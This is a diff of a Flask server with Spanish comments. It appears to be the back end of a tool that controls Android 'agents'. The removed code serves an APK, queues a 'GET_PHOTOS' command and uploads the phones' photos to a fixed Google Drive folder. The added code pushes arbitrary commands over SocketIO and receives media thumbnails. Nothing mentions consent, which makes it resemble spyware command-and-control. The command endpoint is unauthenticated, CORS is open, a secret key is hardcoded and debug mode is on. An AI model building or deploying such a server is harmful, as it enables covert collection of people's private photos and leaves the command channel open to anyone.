@@ -1,124 +1,114 @@
 import os
 import json
-import base64
-import uuid
 from flask import Flask, request, jsonify, send_from_directory
-from datetime import datetime
-from pydrive2.auth import GoogleAuth
-from pydrive2.drive import GoogleDrive
-from io import BytesIO
-from google.oauth2.service_account import Credentials
+from flask_socketio import SocketIO, emit
 
 # --- CONFIGURACIÓN ---
-DRIVE_FOLDER_ID = '1Tux8uqv--gJjUc9_HrSZZEHsRyuzdJGO'
-DEVICES_DB_FILE = 'devices.json'
 app = Flask(__name__)
-drive = None
-pending_command = None 
+# La 'SECRET_KEY' es necesaria para SocketIO
+app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'una-clave-secreta-muy-segura!')
+# Usamos el modo 'threading' que es compatible con gunicorn
+socketio = SocketIO(app, async_mode='threading', cors_allowed_origins="*")
 
-# --- Funciones de Datos ---
-def load_data(filepath, default_data):
-    if not os.path.exists(filepath): return default_data
-    try:
-        with open(filepath, 'r') as f: return json.load(f)
-    except Exception: return default_data
-def save_data(filepath, data):
-    with open(filepath, 'w') as f: json.dump(data, f, indent=4)
+# Diccionario para mantener un registro de los agentes conectados
+# La clave es el 'sid' de la conexión, el valor son los datos del agente
+connected_agents = {}
 
-# --- Autenticación ---
-def authenticate_gdrive():
-    secrets_json_str = os.environ.get('GOOGLE_CLIENT_SECRETS')
-    if not secrets_json_str: raise Exception("Var de entorno GOOGLE_CLIENT_SECRETS no encontrada.")
-    secrets_dict = json.loads(secrets_json_str)
-    credentials = Credentials.from_service_account_info(secrets_dict, scopes=['https://www.googleapis.com/auth/drive'])
-    gauth = GoogleAuth(); gauth.credentials = credentials
-    return GoogleDrive(gauth)
-
-# --- Endpoints ---
+# --- RUTAS HTTP (Para el Panel de Control) ---
 
 @app.route('/')
-def serve_index(): return send_from_directory('.', 'index.html')
+def serve_index():
+    # Esta ruta puede servir una página de estado si lo deseas
+    return "Servidor Backend Activo"
 
-@app.route('/download/agent')
-def download_agent_apk():
-    try: return send_from_directory('public', 'app-debug.apk', as_attachment=True)
-    except FileNotFoundError: return "APK no encontrado.", 404
+@app.route('/api/get-agents', methods=['GET'])
+def get_agents():
+    """
+    Endpoint para que el panel de control obtenga la lista de agentes.
+    """
+    # Devolvemos una lista de los valores del diccionario de agentes
+    return jsonify(list(connected_agents.values()))
 
-@app.route('/trigger-fetch', methods=['POST'])
-def trigger_fetch_command():
-    global pending_command
-    pending_command = "GET_PHOTOS"
-    print("[SERVER] Orden 'GET_PHOTOS' recibida y activada.")
+@app.route('/api/send-command', methods=['POST'])
+def send_command_to_agent():
+    """
+    Endpoint para que el panel de control envíe un comando a un agente específico.
+    """
+    data = request.json
+    target_sid = data.get('target_id') # En el panel, el 'id' del agente es su 'sid'
+    action = data.get('action')
+    payload = data.get('payload', '')
+
+    if not target_sid or not action:
+        return jsonify({"status": "error", "message": "Faltan target_id o action"}), 400
+
+    if target_sid not in connected_agents:
+        return jsonify({"status": "error", "message": "Agente no encontrado o desconectado"}), 404
+
+    # Usamos socketio.emit para enviar el comando al cliente correcto
+    # El evento se llama 'server_command', que la app de Android debe escuchar
+    socketio.emit('server_command', {'command': action, 'payload': payload}, to=target_sid)
+    
+    print(f"[COMANDO] Enviando '{action}' al agente {connected_agents[target_sid].get('name')}")
+    return jsonify({"status": "success", "message": f"Comando '{action}' enviado."})
+
+@app.route('/api/media-upload', methods=['POST'])
+def handle_media_upload():
+    """
+    Endpoint para que el agente de Android envíe las miniaturas.
+    (Esta es una implementación posible, necesitarías añadir la lógica de Google Drive aquí)
+    """
+    data = request.json
+    agent_id = data.get('agent_id')
+    files = data.get('files')
+    print(f"Recibidas {len(files)} miniaturas del agente {agent_id}")
+    # Aquí iría tu lógica para subir los archivos a Google Drive o almacenarlos temporalmente
     return jsonify({"status": "success"})
 
-@app.route('/get-command')
-def get_command_for_agent():
-    global pending_command
-    device_id = request.args.get('deviceId')
+
+# --- EVENTOS DE WEBSOCKET (Para los Agentes de Android) ---
+
+@socketio.on('connect')
+def handle_connect():
+    """
+    Se ejecuta cuando un nuevo agente de Android se conecta.
+    """
+    # El 'sid' es un ID de sesión único que SocketIO asigna a cada cliente
+    sid = request.sid
     device_name = request.args.get('deviceName', 'Dispositivo Desconocido')
     
-    if not device_id: return jsonify({"command": "NONE"}), 400
+    # Guardamos la información del agente
+    connected_agents[sid] = {
+        'id': sid, # Usamos el sid como ID único del agente
+        'name': device_name,
+        'status': 'connected'
+    }
+    print(f"[CONEXIÓN] Nuevo agente conectado: {device_name} (ID: {sid})")
+    # Opcional: notificar al panel de control que un nuevo agente se conectó
 
-    devices = load_data(DEVICES_DB_FILE, {})
-    devices.setdefault(device_id, {'status': 'active'})
-    devices[device_id]['name'] = device_name
-    devices[device_id]['last_seen'] = str(datetime.now())
-    save_data(DEVICES_DB_FILE, devices)
-    
-    if devices[device_id]['status'] == 'paused': return jsonify({"command": "NONE"})
+@socketio.on('disconnect')
+def handle_disconnect():
+    """
+    Se ejecuta cuando un agente de Android se desconecta.
+    """
+    sid = request.sid
+    agent_info = connected_agents.pop(sid, None)
+    if agent_info:
+        print(f"[DESCONEXIÓN] Agente desconectado: {agent_info.get('name')} (ID: {sid})")
+    # Opcional: notificar al panel de control que un agente se desconectó
 
-    if pending_command:
-        command_to_send = pending_command
-        pending_command = None
-        print(f"[SERVER] Entregando orden '{command_to_send}' a {device_name}")
-        return jsonify({"command": command_to_send})
-        
-    return jsonify({"command": "NONE"})
+@socketio.on('agent_response')
+def handle_agent_response(data):
+    """
+    Escucha respuestas genéricas que el agente pueda enviar.
+    """
+    sid = request.sid
+    agent_name = connected_agents.get(sid, {}).get('name', 'Desconocido')
+    print(f"Respuesta recibida del agente {agent_name}: {data}")
 
-@app.route('/get-devices', methods=['GET'])
-def get_devices():
-    return jsonify(load_data(DEVICES_DB_FILE, {}))
-
-@app.route('/toggle-status', methods=['POST'])
-def toggle_status():
-    device_id = request.json.get('deviceId')
-    devices = load_data(DEVICES_DB_FILE, {})
-    if device_id in devices:
-        current_status = devices[device_id].get('status', 'active')
-        devices[device_id]['status'] = 'paused' if current_status == 'active' else 'active'
-        save_data(DEVICES_DB_FILE, devices)
-        return jsonify({"status": "success", "new_state": devices[device_id]['status']})
-    return jsonify({"status": "error", "message": "Device not found"}), 404
-
-@app.route('/upload', methods=['POST'])
-def upload_to_drive():
-    global drive
-    if not drive:
-        return jsonify({"status": "error", "message": "Conexión con Google Drive no inicializada."}), 503
-
-    data = request.json
-    if not data or 'files' not in data:
-        return jsonify({"status": "error", "message": "Formato de datos incorrecto."}), 400
-
-    for file_info in data.get('files', []):
-        try:
-            file_bytes = base64.b64decode(file_info.get('data', ''))
-            file_in_memory = BytesIO(file_bytes)
-            unique_filename = f"{uuid.uuid4().hex}_{file_info.get('name')}"
-            
-            drive_file = drive.CreateFile({'title': unique_filename, 'parents': [{'id': DRIVE_FOLDER_ID}]})
-            drive_file.content = file_in_memory
-            drive_file.Upload()
-            print(f"  [SUCCESS] Archivo subido: {unique_filename}")
-        except Exception as e:
-            print(f"  [ERROR] Falló la subida para '{file_info.get('name')}': {e}")
-            
-    return jsonify({"status": "success"})
 
 # --- INICIALIZACIÓN ---
-with app.app_context():
-    try:
-        drive = authenticate_gdrive()
-        print("Autenticación con Google Drive exitosa al arrancar.")
-    except Exception as e:
-        print(f"ERROR CRÍTICO AL ARRANCAR: {e}")
+if __name__ == '__main__':
+    print("Iniciando servidor Flask con SocketIO...")
+    # El host '0.0.0.0' es necesario para que sea accesible desde fuera del contenedor
+    socketio.run(app, host='0.0.0.0', port=int(os.environ.get('PORT', 10000)), debug=True)
